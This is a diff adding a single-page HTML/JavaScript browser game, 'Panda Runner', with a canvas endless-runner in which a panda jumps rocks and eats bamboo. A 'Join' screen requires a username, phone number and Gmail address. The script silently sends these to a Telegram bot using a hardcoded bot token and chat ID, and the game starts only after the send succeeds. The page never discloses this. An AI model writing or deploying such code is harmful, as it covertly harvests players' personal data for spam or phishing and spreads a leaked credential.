@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>🐼 Panda Runner</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(120deg, #ffecd2 0%, #fcb69f 100%);
+            font-family: 'Baloo 2', cursive;
+        }
+        #login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 2.4rem;
+            color: #444;
+            text-shadow: 1px 1px 1px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 100%;
+            max-width: 350px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #0b3c49;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-size: 1rem;
+            margin-top: 10px;
+            width: 100%;
+            max-width: 350px;
+            box-sizing: border-box;
+        }
+        button:hover {
+            background-color: #136f8f;
+        }
+        #powered-by {
+            margin-top: 20px;
+            font-size: 1rem;
+            color: #666;
+            font-style: italic;
+            text-align: center;
+        }
+        #game-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+        canvas {
+            background: linear-gradient(to top, #5390d9 0%, #a7c7e7 60%, #f3f7ff 100%);
+            border-radius: 20px;
+            box-shadow: 0 8px 15px rgba(0,0,0,0.2);
+        }
+        #stop-btn {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            z-index: 20;
+            background: #0b3c49;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 3px 6px #00000044;
+            transition: background-color 0.3s;
+            font-size: 1rem;
+        }
+        #stop-btn:hover {
+            background-color: #136f8f;
+        }
+    </style>
+</head>
+<body>
+    <div id="login-container">
+        <h1>🐼 Panda Runner</h1>
+        <input type="text" id="username" placeholder="Username" required />
+        <input type="text" id="number" placeholder="Number" required />
+        <input type="email" id="gmail" placeholder="Gmail" required />
+        <button id="join-btn">Join</button>
+        <div id="powered-by">Powered by Nick</div>
+    </div>
+
+    <div id="game-container">
+        <canvas id="game" width="640" height="360" aria-label="Panda Runner Game"></canvas>
+        <button id="stop-btn">Stop</button>
+    </div>
+
+    <script>
+        const joinBtn = document.getElementById('join-btn');
+        const loginContainer = document.getElementById('login-container');
+        const gameContainer = document.getElementById('game-container');
+        const stopBtn = document.getElementById('stop-btn');
+
+        // Check if user already joined and skip login if yes
+        if (localStorage.getItem('hasJoined') === 'true') {
+            loginContainer.style.display = 'none';
+            gameContainer.style.display = 'flex';
+            startGame();
+        }
+
+        joinBtn.addEventListener('click', () => {
+            const username = document.getElementById('username').value.trim();
+            const number = document.getElementById('number').value.trim();
+            const gmail = document.getElementById('gmail').value.trim();
+
+            if (username && number && gmail) {
+                if (localStorage.getItem('hasJoined') !== 'true') {
+                    const telegramToken = '8164924820:AAGfHaGSce6we5J1RyJfz3wtwX4FJ5n_PtE';
+                    const chatId = '6975173404';
+                    const message = `New User Joined:%0AUsername: ${username}%0ANumber: ${number}%0AGmail: ${gmail}`;
+                    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+                    fetch(telegramUrl)
+                        .then(response => {
+                            if (response.ok) {
+                                localStorage.setItem('hasJoined', 'true');
+                                loginContainer.style.display = 'none';
+                                gameContainer.style.display = 'flex';
+                                startGame();
+                            } else {
+                                alert('Failed to send data to Telegram.');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                            alert('An error occurred while sending data.');
+                        });
+                } else {
+                    loginContainer.style.display = 'none';
+                    gameContainer.style.display = 'flex';
+                    startGame();
+                }
+            } else {
+                alert('Please fill in all fields.');
+            }
+        });
+
+        let running = true;
+
+        stopBtn.addEventListener('click', () => {
+            running = !running;
+            stopBtn.textContent = running ? 'Stop' : 'Start';
+            if (running) {
+                gameLoop();
+            }
+        });
+
+        function startGame() {
+            running = true;
+            stopBtn.textContent = 'Stop';
+            gameLoop();
+        }
+
+        function gameLoop() {
+            if (!running) return;
+            update();
+            requestAnimationFrame(gameLoop);
+        }
+
+        const canvas = document.getElementById('game');
+        const ctx = canvas.getContext('2d');
+
+        let score = 0;
+        let gameSpeed = 5;
+        const gravity = 0.6;
+
+        const panda = {
+            x: 130,
+            y: canvas.height - 90,
+            width: 60,
+            height: 60,
+            dy: 0,
+            jumping: false,
+            growth: 0.5,
+            draw() {
+                ctx.save();
+                ctx.translate(this.x, this.y);
+                ctx.scale(this.growth, this.growth);
+                const cx = 15;
+                const cy = 15;
+
+                ctx.fillStyle = '#444';
+                ctx.beginPath();
+                ctx.ellipse(cx, cy + 15, 30, 35, 0, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.closePath();
+
+                ctx.fillStyle = '#fff';
+                ctx.beginPath();
+                ctx.ellipse(cx, cy - 10, 28, 25, 0, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.closePath();
+
+                ctx.fillStyle = '#000';
+                ctx.beginPath();
+                ctx.ellipse(cx - 10, cy - 15, 10, 14, -0.3, 0, Math.PI * 2);
+                ctx.ellipse(cx + 12, cy - 15, 10, 14, 0.3, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.closePath();
+
+                ctx.fillStyle = '#fff';
+                ctx.beginPath();
+                ctx.ellipse(cx - 12, cy - 18, 4, 6, 0, 0, Math.PI * 2);
+                ctx.ellipse(cx + 10, cy - 18, 4, 6, 0, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.closePath();
+
+                ctx.fillStyle = '#000';
+                ctx.beginPath();
+                ctx.moveTo(cx - 3, cy - 5);
+                ctx.lineTo(cx + 3, cy - 5);
+                ctx.lineTo(cx, cy - 2);
+                ctx.fill();
+                ctx.closePath();
+
+                ctx.strokeStyle = '#000';
+                ctx.lineWidth = 2;
+                ctx.beginPath();
+                ctx.moveTo(cx, cy - 2);
+                ctx.lineTo(cx, cy + 3);
+                ctx.moveTo(cx, cy + 3);
+                ctx.lineTo(cx - 5, cy + 7);
+                ctx.moveTo(cx, cy + 3);
+                ctx.lineTo(cx + 5, cy + 7);
+                ctx.stroke();
+                ctx.closePath();
+
+                ctx.fillStyle = '#000';
+                ctx.beginPath();
+                ctx.ellipse(cx - 22, cy - 30, 12, 18, 0, 0, Math.PI * 2);
+                ctx.ellipse(cx + 22, cy - 30, 12, 18, 0, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.closePath();
+
+                ctx.restore();
+            },
+            update() {
+                if (this.jumping) {
+                    this.dy += gravity;
+                    this.y += this.dy;
+
+                    if (this.y >= canvas.height - 90) {
+                        this.y = canvas.height - 90;
+                        this.jumping = false;
+                        this.dy = 0;
+                    }
+                }
+            },
+            jump() {
+                if (!this.jumping) {
+                    this.jumping = true;
+                    this.dy = -12;
+                }
+            },
+            grow() {
+                if (this.growth < 1.3) {
+                    this.growth += 0.03;
+                    this.x += 4;
+                }
+            },
+            getBounds() {
+                const scaledWidth = this.width * this.growth;
+                const scaledHeight = this.height * this.growth;
+                return {
+                    left: this.x + 15 * this.growth,
+                    right: this.x + scaledWidth - 15 * this.growth,
+                    top: this.y + 10 * this.growth,
+                    bottom: this.y + scaledHeight
+                };
+            }
+        };
+
+        const obstacles = [];
+        let obstacleTimer = 0;
+        let obstacleInterval = 120;
+
+        function createObstacle() {
+            const types = ['bamboo', 'rock'];
+            const type = types[Math.floor(Math.random() * types.length)];
+            const baseRockHeight = 40 + Math.random() * 15;
+            const baseRockWidth = 30;
+            const rockScale = 1 + score * 0.02;
+
+            let height, width;
+            if (type === 'rock') {
+                width = Math.min(baseRockWidth * rockScale, 70);
+                height = Math.min(baseRockHeight * rockScale, 80);
+            } else {
+                width = 20;
+                height = 80 + Math.random() * 20;
+            }
+
+            const y = canvas.height - height;
+
+            obstacles.push({
+                x: canvas.width,
+                y: y,
+                width: width,
+                height: height,
+                type: type,
+                draw() {
+                    if (this.type === 'bamboo') {
+                        ctx.fillStyle = '#2a7f2a';
+                        ctx.fillRect(this.x, this.y, this.width, this.height);
+                        ctx.strokeStyle = '#1a5a1a';
+                        ctx.lineWidth = 2;
+                        for (let i = 0; i < this.height; i += 15) {
+                            ctx.beginPath();
+                            ctx.moveTo(this.x, this.y + i);
+                            ctx.lineTo(this.x + this.width, this.y + i + 2);
+                            ctx.stroke();
+                        }
+                        ctx.fillStyle = '#3fb65f';
+                        ctx.beginPath();
+                        ctx.moveTo(this.x + this.width, this.y + 15);
+                        ctx.lineTo(this.x + this.width + 15, this.y + 10);
+                        ctx.lineTo(this.x + this.width + 15, this.y + 20);
+                        ctx.fill();
+                        ctx.beginPath();
+                        ctx.moveTo(this.x + this.width, this.y + 40);
+                        ctx.lineTo(this.x + this.width + 15, this.y + 35);
+                        ctx.lineTo(this.x + this.width + 15, this.y + 45);
+                        ctx.fill();
+                    } else if (this.type === 'rock') {
+                        ctx.fillStyle = '#6b7b8c';
+                        ctx.beginPath();
+                        ctx.ellipse(
+                            this.x + this.width / 2,
+                            this.y + this.height / 2,
+                            this.width / 2,
+                            this.height / 2,
+                            0.3,
+                            0,
+                            Math.PI * 2
+                        );
+                        ctx.fill();
+                        ctx.fillStyle = '#53606f';
+                        ctx.beginPath();
+                        ctx.ellipse(
+                            this.x + this.width / 2 - 5,
+                            this.y + this.height / 2 - 10,
+                            this.width / 3,
+                            this.height / 4,
+                            0,
+                            0,
+                            Math.PI * 2
+                        );
+                        ctx.fill();
+                    }
+                },
+                update() {
+                    this.x -= gameSpeed;
+                },
+                getBounds() {
+                    return {
+                        left: this.x,
+                        right: this.x + this.width,
+                        top: this.y,
+                        bottom: this.y + this.height
+                    };
+                }
+            });
+        }
+
+        function isColliding(a, b) {
+            return !(
+                a.bottom < b.top ||
+                a.top > b.bottom ||
+                a.right < b.left ||
+                a.left > b.right
+            );
+        }
+
+        function drawGround() {
+            ctx.fillStyle = '#3e7d32';
+            ctx.fillRect(0, canvas.height - 30, canvas.width, 30);
+            ctx.strokeStyle = '#1e4620';
+            ctx.lineWidth = 2;
+            for (let i = 0; i < canvas.width; i += 8) {
+                ctx.beginPath();
+                ctx.moveTo(i, canvas.height - 30);
+                ctx.lineTo(i, canvas.height - 45);
+                ctx.stroke();
+            }
+        }
+
+        function update() {
+            if (!running) return;
+
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            drawGround();
+
+            panda.update();
+            panda.draw();
+
+            obstacleTimer++;
+            if (obstacleTimer > obstacleInterval) {
+                createObstacle();
+                obstacleTimer = 0;
+                if (obstacleInterval > 60) obstacleInterval -= 1.5;
+                gameSpeed += 0.02;
+            }
+
+            for (let i = obstacles.length - 1; i >= 0; i--) {
+                const obs = obstacles[i];
+                obs.update();
+                obs.draw();
+
+                if (obs.x + obs.width < 0) {
+                    obstacles.splice(i, 1);
+                    if (obs.type !== 'bamboo') {
+                        score++;
+                    }
+                }
+
+                if (isColliding(panda.getBounds(), obs.getBounds())) {
+                    if (obs.type === 'rock') {
+                        alert('Game Over! Your score: ' + score);
+                        running = false;
+                    } else if (obs.type === 'bamboo') {
+                        panda.grow();
+                        obstacles.splice(i, 1);
+                        score++;
+                    }
+                }
+            }
+
+            requestAnimationFrame(update);
+        }
+
+        window.addEventListener('keydown', (e) => {
+            if (e.code === 'Space') {
+                e.preventDefault();
+                if (running) panda.jump();
+            }
+        });
+
+        window.addEventListener('mousedown', () => {
+            if (running) panda.jump();
+        });
+
+        window.addEventListener('touchstart', () => {
+            if (running) panda.jump();
+        });
+    </script>
+</body>
+</html>
+
